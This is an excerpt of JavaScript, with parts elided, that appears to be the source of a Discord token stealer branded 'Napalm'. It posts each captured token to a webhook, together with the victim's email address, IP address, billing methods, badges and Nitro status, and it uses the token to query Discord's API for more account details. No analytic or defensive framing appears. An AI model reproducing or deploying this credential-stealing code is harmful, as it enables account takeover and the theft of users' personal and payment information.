    ...
    for (let token of tokens) {
        ...
        axios.post(wbk, {
            ...
            embeds: [{
                "fields": [
                    {
                        name: `<a:Napalm:1012706914527891476> Token:`,
                        value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
                        inline: false
                    },
                    {
                        name: `<:Napalm:1012707124763177022> Badges:`,
                        value: getBadges(json.flags),
                        inline: true
                    },
                    {
                        name: `<:Napalm:1012707326223982692> Nitro Type:`,
                        value: await getNitro(json.premium_type, json.id, token),
                        inline: true
                    },
                    {
                        name: `<a:Napalm:1012707511830331442> Billing:`,
                        value: billing,
                        inline: true
                    },
                    {
                        name: `<:Napalm:1012707970653626408> Email:`,
                        value: `\`${json.email}\``,
                        inline: true
                    },
                    {
                        name: `<:Napalm:1012707773424865310> IP:`,
                        value: `\`${ip}\``,
                        inline: true
                    },
                    {
...
async function getBilling(token) {
    ...
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:Napalm:1012751314431770624>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:Napalm:1012755275494735933>";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
...
async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:9627478027971Napalm5>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                ...
                .catch(() => { })
            if (!info) return "<:946246402105819216:9627478027971Napalm5>";

            if (!info.premium_guild_since) return "<:946246402105819216:9627478027971Napalm5>";
            ...
            return `<:946246402105819216:9627478027971Napalm5> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}
